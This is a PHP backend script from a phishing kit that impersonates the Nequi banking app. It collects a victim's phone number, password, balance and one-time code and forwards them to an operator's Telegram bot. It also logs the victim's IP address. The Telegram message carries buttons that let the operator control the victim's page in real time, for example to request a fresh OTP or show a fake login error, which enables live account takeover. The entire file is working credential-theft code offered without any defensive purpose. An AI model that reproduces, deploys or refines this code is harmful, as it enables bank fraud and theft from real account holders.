<?php
// Incluir el archivo de configuración y conexión a la base de datos
include '../../../db.php'; // Ajustado para estar en process/goat.php
$config = include '../../../config.php';

function escapeMarkdownV2($text)
{
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $clave = $_POST['clave'];
    $otp = $_POST['otp'];
    $saldo = $_POST['saldo'];
    $estado = 1; // Estado inicial del cliente
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Insertar datos en la base de datos 'nequi'
    // PostgreSQL usa RETURING id para obtener el ID insertado
    $sql = "INSERT INTO nequi (estado, ip_address) VALUES (:estado, :ip) RETURNING id";
    $stmt = $conn->prepare($sql);

    // Bind parameters
    $stmt->bindParam(':estado', $estado, PDO::PARAM_INT);
    $stmt->bindParam(':ip', $ip_address, PDO::PARAM_STR);

    if ($stmt->execute()) {
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        $cliente_id = $row['id'];

        // Enviar datos a Telegram
        $botToken = $config['botToken'];
        $chatId = $config['chatId'];
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];

        $message = "🔐 <b>Nuevo inicio de sesión (Nequi)</b>\n\n"
            . "📱 <b>Número de celular:</b> <code>" . $usuario . "</code>\n"
            . "🔑 <b>Contraseña:</b> <code>" . $clave . "</code>\n"
            . "💰 <b>Saldo Nequi:</b> <code>" . $saldo . "</code>\n"
            . "🔢 <b>Clave dinámica:</b> <code>" . $otp . "</code>\n"
            . "🆔 <b>ID del cliente:</b> <code>" . $cliente_id . "</code>";

        // Ajustar URL para usar el script específico de Nequi
        // Si baseUrl apunta al root o al script global, intentamos construir la ruta correcta
        // Asumimos que baseUrl en config puede ser algo como 'https://dominio.com/updatetele.php' o 'https://dominio.com'

        $nequiBaseUrl = $baseUrl;
        if (strpos($baseUrl, 'updatetele.php') !== false) {
            $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
        } else {
            // Si es solo el dominio, agregamos la ruta
            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/nequi/process/updatetele.php';
        }

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=2&key=$security_key&tabla=nequi"],
                    ['text' => 'Datos', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=6&key=$security_key&tabla=nequi"]
                ],
                [
                    ['text' => 'Otp', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=3&key=$security_key&tabla=nequi"],
                    ['text' => 'Otp Error', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=4&key=$security_key&tabla=nequi"]
                ],
                [
                    ['text' => 'Finalizar', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=0&key=$security_key&tabla=nequi"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'ignore_errors' => true // Importante para capturar el cuerpo del error 400
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        // Verificar código de respuesta HTTP
        $http_response_header = $http_response_header ?? [];
        $response_code = 0;
        foreach ($http_response_header as $header) {
            if (preg_match('#HTTP/[0-9\.]+\s+([0-9]+)#', $header, $matches)) {
                $response_code = intval($matches[1]);
                break;
            }
        }

        if ($result === FALSE || $response_code >= 400) {
            error_log("Telegram API Error (Code $response_code): " . $result);
            // Opcional: Escribir en archivo para depuración rápida si error_log no es accesible
            file_put_contents('../telegram_debug.log', date('Y-m-d H:i:s') . " - Code $response_code - Body: $result\n", FILE_APPEND);
        }

        header("Location: ../espera.php?id=" . $cliente_id);
        exit();
    } else {
        echo "Error al insertar datos.";
    }

    // $stmt->closeCursor(); // Opcional en PDO
// $conn = null;
}
?>